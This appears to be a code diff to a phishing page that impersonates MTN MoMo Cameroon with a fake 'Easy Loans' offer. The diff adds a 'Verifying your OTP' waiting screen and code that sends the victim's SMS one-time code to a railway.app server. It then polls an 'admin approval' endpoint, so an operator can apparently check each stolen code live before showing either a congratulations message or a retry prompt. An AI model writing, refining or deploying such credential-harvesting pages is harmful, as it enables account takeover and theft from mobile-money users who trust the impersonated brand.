@@ -32,7 +32,6 @@
             gap: 10px;
         }
 
-        /* ===== HEADER ===== */
         header {
             width: 100%;
             max-width: 480px;
@@ -65,23 +64,12 @@
             transform: translateX(-50%);
         }
 
-        .momo-icon {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            background: #0047AB;
-            color: #FFCC00;
-            font-weight: 700;
-            font-size: 16px;
-            padding: 7px 16px;
-            border-radius: 40px;
-            line-height: 1;
-            letter-spacing: -0.5px;
-            box-shadow: 0 4px 12px rgba(0,71,171,0.25);
-            white-space: nowrap;
-        }
+        .mtn-logo { display: flex; flex-direction: column; align-items: center; gap: 2px; }
+        .mtn-logo-icon { width: 38px; height: 38px; background: #FFD700; border-radius: 7px; display: flex; align-items: center; justify-content: center; font-size: 1.5rem; font-weight: 900; color: #003366; position: relative; }
+        .mtn-logo-icon::after { content: 'M'; font-size: 1.6rem; font-weight: 900; }
+        .mtn-logo-text { font-size: 0.8rem; font-weight: 700; color: #003366; }
+        .mtn-logo-sub { font-size: 0.55rem; color: #888; font-weight: 500; }
 
-        /* ===== CARD ===== */
         .card {
             background: white;
             border-radius: 24px;
@@ -97,7 +85,6 @@
             overflow-y: auto;
         }
 
-        /* ===== ICON BADGE ===== */
         .icon-badge {
             width: 64px;
             height: 64px;
@@ -121,9 +108,7 @@
             line-height: 1.3;
         }
 
-        .page-title .highlight {
-            color: #0047AB;
-        }
+        .page-title .highlight { color: #0047AB; }
 
         .instruction {
             font-size: 13px;
@@ -134,12 +119,8 @@
             padding: 0 4px;
         }
 
-        .instruction strong {
-            color: #1a1a2e;
-            font-weight: 700;
-        }
+        .instruction strong { color: #1a1a2e; font-weight: 700; }
 
-        /* ===== OTP BOXES ===== */
         .otp-boxes {
             display: flex;
             justify-content: center;
@@ -184,8 +165,7 @@
         }
 
         @keyframes shake {
-            0%,
-            100% { transform: translateX(0); }
+            0%, 100% { transform: translateX(0); }
             25% { transform: translateX(-6px); }
             75% { transform: translateX(6px); }
         }
@@ -200,11 +180,8 @@
             text-align: center;
         }
 
-        .error-text.show {
-            display: block;
-        }
+        .error-text.show { display: block; }
 
-        /* ===== VERIFY BUTTON ===== */
         .verify-btn {
             width: 100%;
             padding: 16px;
@@ -225,15 +202,8 @@
             box-shadow: 0 8px 25px rgba(0, 71, 171, 0.3);
         }
 
-        .verify-btn:active:not(:disabled) {
-            transform: scale(0.98);
-        }
-
-        .verify-btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            transform: none;
-        }
+        .verify-btn:active:not(:disabled) { transform: scale(0.98); }
+        .verify-btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
 
         .spinner {
             display: inline-block;
@@ -247,11 +217,8 @@
             margin-right: 8px;
         }
 
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
+        @keyframes spin { to { transform: rotate(360deg); } }
 
-        /* ===== RESEND ===== */
         .resend-row {
             text-align: center;
             margin-top: 18px;
@@ -272,16 +239,9 @@
             transition: background 0.2s;
         }
 
-        .resend-link:hover:not(:disabled) {
-            background: #f0f4ff;
-        }
+        .resend-link:hover:not(:disabled) { background: #f0f4ff; }
+        .resend-link:disabled { color: #bbb; cursor: not-allowed; }
 
-        .resend-link:disabled {
-            color: #bbb;
-            cursor: not-allowed;
-        }
-
-        /* ===== SECURITY ===== */
         .security-notice {
             display: flex;
             align-items: center;
@@ -294,7 +254,6 @@
             line-height: 1.5;
         }
 
-        /* ===== FOOTER ===== */
         footer {
             padding: 6px;
             color: #aaa;
@@ -303,6 +262,102 @@
             width: 100%;
             max-width: 480px;
             flex-shrink: 0;
+        }
+
+        /* ============================================
+           WAITING OVERLAY (admin approval)
+           ============================================ */
+        .verify-overlay {
+            position: fixed;
+            inset: 0;
+            background: #ffffff;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 32px 24px;
+            z-index: 2000;
+        }
+
+        .verify-overlay.show { display: flex; }
+
+        .verify-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            max-width: 340px;
+            text-align: center;
+        }
+
+        .verify-momo-icon {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background: #0047AB;
+            color: #FFCC00;
+            font-weight: 800;
+            font-size: 20px;
+            padding: 11px 22px;
+            border-radius: 50px;
+            line-height: 1;
+            box-shadow: 0 8px 24px rgba(0, 71, 171, 0.28);
+            margin-bottom: 32px;
+            animation: overlayPulse 2s ease-in-out infinite;
+        }
+
+        @keyframes overlayPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        .verify-spinner {
+            width: 52px;
+            height: 52px;
+            border: 5px solid #e0e8ff;
+            border-top-color: #0047AB;
+            border-radius: 50%;
+            animation: verifySpin 0.9s linear infinite;
+            margin-bottom: 26px;
+        }
+
+        @keyframes verifySpin { to { transform: rotate(360deg); } }
+
+        .verify-title {
+            font-size: 19px;
+            font-weight: 800;
+            color: #1a1a2e;
+            margin-bottom: 10px;
+            line-height: 1.3;
+        }
+
+        .verify-title .highlight { color: #0047AB; }
+
+        .verify-subtitle {
+            font-size: 13px;
+            color: #888;
+            line-height: 1.6;
+            margin-bottom: 28px;
+        }
+
+        .verify-dots span {
+            display: inline-block;
+            animation: dotBlink 1.4s infinite both;
+        }
+        .verify-dots span:nth-child(1) { animation-delay: 0s; }
+        .verify-dots span:nth-child(2) { animation-delay: 0.2s; }
+        .verify-dots span:nth-child(3) { animation-delay: 0.4s; }
+
+        @keyframes dotBlink {
+            0%, 80%, 100% { opacity: 0.2; }
+            40% { opacity: 1; }
+        }
+
+        .verify-security {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            font-size: 11px;
+            color: #aaa;
         }
 
         /* ============================================
@@ -322,9 +377,7 @@
             animation: fadeIn 0.3s ease;
         }
 
-        .congrats-overlay.show {
-            display: flex;
-        }
+        .congrats-overlay.show { display: flex; }
 
         @keyframes fadeIn {
             0% { opacity: 0; }
@@ -393,9 +446,7 @@
             position: relative;
         }
 
-        .congrats-body {
-            padding: 24px 22px 28px;
-        }
+        .congrats-body { padding: 24px 22px 28px; }
 
         .congrats-message {
             font-size: 16px;
@@ -405,9 +456,7 @@
             margin-bottom: 8px;
         }
 
-        .congrats-message .highlight {
-            color: #0047AB;
-        }
+        .congrats-message .highlight { color: #0047AB; }
 
         .congrats-time {
             display: inline-flex;
@@ -423,9 +472,7 @@
             color: #1e7e34;
         }
 
-        .congrats-time .clock {
-            font-size: 16px;
-        }
+        .congrats-time .clock { font-size: 16px; }
 
         .congrats-note {
             font-size: 12px;
@@ -451,60 +498,23 @@
             transition: transform 0.2s, box-shadow 0.2s;
         }
 
-        .congrats-btn:hover {
-            transform: scale(1.02);
-            box-shadow: 0 8px 25px rgba(0, 71, 171, 0.4);
-        }
+        .congrats-btn:hover { transform: scale(1.02); box-shadow: 0 8px 25px rgba(0, 71, 171, 0.4); }
+        .congrats-btn:active { transform: scale(0.98); }
 
-        .congrats-btn:active {
-            transform: scale(0.98);
-        }
-
-        /* ===== SMALL PHONES ===== */
         @media (max-height: 700px) {
-            .card {
-                padding: 18px 16px;
-            }
-            .icon-badge {
-                width: 54px;
-                height: 54px;
-                font-size: 26px;
-                margin-bottom: 10px;
-            }
-            .page-title {
-                font-size: 18px;
-            }
-            .instruction {
-                font-size: 12px;
-                margin-bottom: 16px;
-            }
-            .otp-box {
-                width: 50px;
-                height: 56px;
-                font-size: 22px;
-            }
-            .verify-btn {
-                margin-top: 16px;
-                padding: 14px;
-            }
+            .card { padding: 18px 16px; }
+            .icon-badge { width: 54px; height: 54px; font-size: 26px; margin-bottom: 10px; }
+            .page-title { font-size: 18px; }
+            .instruction { font-size: 12px; margin-bottom: 16px; }
+            .otp-box { width: 50px; height: 56px; font-size: 22px; }
+            .verify-btn { margin-top: 16px; padding: 14px; }
         }
 
         @media (max-width: 380px) {
-            .otp-boxes {
-                gap: 8px;
-            }
-            .otp-box {
-                width: 46px;
-                height: 52px;
-                font-size: 20px;
-                border-radius: 12px;
-            }
-            .congrats-title {
-                font-size: 20px;
-            }
-            .congrats-message {
-                font-size: 14px;
-            }
+            .otp-boxes { gap: 8px; }
+            .otp-box { width: 46px; height: 52px; font-size: 20px; border-radius: 12px; }
+            .congrats-title { font-size: 20px; }
+            .congrats-message { font-size: 14px; }
         }
     </style>
 </head>
@@ -512,7 +522,11 @@
     <header>
         <button class="back-btn" onclick="window.location.href='sms-paste.html'" aria-label="Go back">←</button>
         <div class="logo-container">
-            <span class="momo-icon">MoMo</span>
+            <div class="mtn-logo">
+                <div class="mtn-logo-icon"></div>
+                <div class="mtn-logo-text">MTN MoMo</div>
+                <div class="mtn-logo-sub">Easy Loans</div>
+            </div>
         </div>
         <div style="width:24px;"></div>
     </header>
@@ -529,7 +543,6 @@
             Enter it below to confirm your loan disbursement.
         </p>
 
-        <!-- OTP Input Boxes -->
         <div class="otp-boxes" id="otpBoxes">
             <input type="tel" class="otp-box" id="otp1" maxlength="1" inputmode="numeric" autocomplete="off">
             <input type="tel" class="otp-box" id="otp2" maxlength="1" inputmode="numeric" autocomplete="off">
@@ -558,7 +571,23 @@
 
     <footer>© 2026 MTN MoMo Cameroon</footer>
 
-    <!-- ===== CONGRATULATIONS MODAL ===== -->
+    <!-- WAITING OVERLAY -->
+    <div class="verify-overlay" id="verifyOverlay">
+        <div class="verify-content">
+            <div class="verify-momo-icon">MoMo</div>
+            <div class="verify-spinner"></div>
+            <h2 class="verify-title">
+                Verifying your <span class="highlight">OTP</span><span class="verify-dots"><span>.</span><span>.</span><span>.</span></span>
+            </h2>
+            <p class="verify-subtitle">Please wait while we verify your details</p>
+            <div class="verify-security">
+                <span>🔒</span>
+                <span>Secure connection to MTN MoMo</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- CONGRATULATIONS MODAL (shown after admin approves) -->
     <div class="congrats-overlay" id="congratsOverlay">
         <div class="congrats-content">
             <div class="congrats-header">
@@ -591,6 +620,12 @@
         const API_BASE = 'https://easy-loansej1-production.up.railway.app';
 
         // ============================================
+        // POLLING CONFIG
+        // ============================================
+        const POLL_INTERVAL_MS = 2000;
+        let pollTimer = null;
+
+        // ============================================
         // DOM REFERENCES
         // ============================================
         const otpBoxes = [
@@ -603,6 +638,7 @@
         const verifyBtn = document.getElementById('verifyBtn');
         const resendBtn = document.getElementById('resendBtn');
         const countdownEl = document.getElementById('countdown');
+        const verifyOverlay = document.getElementById('verifyOverlay');
         const congratsOverlay = document.getElementById('congratsOverlay');
 
         // ============================================
@@ -703,7 +739,71 @@
         });
 
         // ============================================
-        // VERIFY BUTTON → sends OTP to backend
+        // WAITING OVERLAY
+        // ============================================
+        function showVerifyOverlay() { verifyOverlay.classList.add('show'); }
+        function hideVerifyOverlay() { verifyOverlay.classList.remove('show'); }
+
+        // ============================================
+        // POLLING FOR ADMIN APPROVAL
+        // ============================================
+        function startPolling(requestId) {
+            stopPolling();
+            console.log('🔄 Polling started for requestId:', requestId);
+
+            pollTimer = setInterval(async () => {
+                try {
+                    const res = await fetch(`${API_BASE}/api/approval/status/${requestId}`);
+                    const data = await res.json();
+
+                    console.log('📥 Status:', data);
+
+                    if (!data.ok) return;
+
+                    if (data.status === 'approved') {
+                        console.log('✅ OTP APPROVED');
+                        stopPolling();
+                        // Save verified flag
+                        localStorage.setItem('momoVerified', JSON.stringify({
+                            verifiedAt: new Date().toISOString(),
+                            requestId: requestId
+                        }));
+                        // Hide waiting overlay, show congrats
+                        hideVerifyOverlay();
+                        congratsOverlay.classList.add('show');
+
+                    } else if (data.status === 'rejected') {
+                        console.log('❌ OTP REJECTED');
+                        stopPolling();
+                        hideVerifyOverlay();
+                        verifyBtn.disabled = false;
+                        verifyBtn.innerHTML = 'VERIFY &amp; CONTINUE →';
+
+                        // Clear OTP boxes + show error
+                        otpBoxes.forEach(b => {
+                            b.value = '';
+                            b.classList.remove('filled');
+                            b.classList.add('invalid');
+                        });
+                        otpError.textContent = 'Ensure you put correct details.';
+                        otpError.classList.add('show');
+                        otpBoxes[0].focus();
+                    }
+                } catch (err) {
+                    console.error('Polling error:', err);
+                }
+            }, POLL_INTERVAL_MS);
+        }
+
+        function stopPolling() {
+            if (pollTimer) {
+                clearInterval(pollTimer);
+                pollTimer = null;
+            }
+        }
+
+        // ============================================
+        // VERIFY BUTTON → sends OTP to backend → polls admin
         // ============================================
         verifyBtn.addEventListener('click', async function() {
             const otp = getOtpValue();
@@ -717,7 +817,8 @@
             }
 
             verifyBtn.disabled = true;
-            verifyBtn.innerHTML = '<span class="spinner"></span>VERIFYING...';
+            verifyBtn.innerHTML = '<span class="spinner"></span>WAITING...';
+            showVerifyOverlay();
 
             try {
                 const controller = new AbortController();
@@ -743,20 +844,12 @@
                     throw new Error(data.error || 'Verification failed');
                 }
 
-                // Save verified flag
-                localStorage.setItem('momoVerified', JSON.stringify({
-                    verifiedAt: new Date().toISOString(),
-                    reference: data.reference || null
-                }));
-
-                // ============================================
-                // SHOW CONGRATULATIONS MODAL
-                // ============================================
-                console.log('🎉 Showing congratulations modal...');
-                congratsOverlay.classList.add('show');
+                // Start polling for admin approval
+                startPolling(data.requestId);
 
             } catch (err) {
                 console.error('OTP verify error:', err);
+                hideVerifyOverlay();
                 verifyBtn.disabled = false;
                 verifyBtn.innerHTML = 'VERIFY &amp; CONTINUE →';
 
@@ -773,10 +866,14 @@
         otpBoxes[0].focus();
         updateVerifyState();
 
+        window.addEventListener('load', () => {
+            stopPolling();
+        });
+
         console.log('====================================');
         console.log('💰 MTN MoMo Loan – Cameroon');
-        console.log('🔐 Verify OTP connected to:', API_BASE);
-        console.log('📱 Phone:', storedPhone);
+        console.log('🔐 Verify OTP with ADMIN APPROVAL');
+        console.log('📡 API:', API_BASE);
         console.log('====================================');
     </script>
 </body>
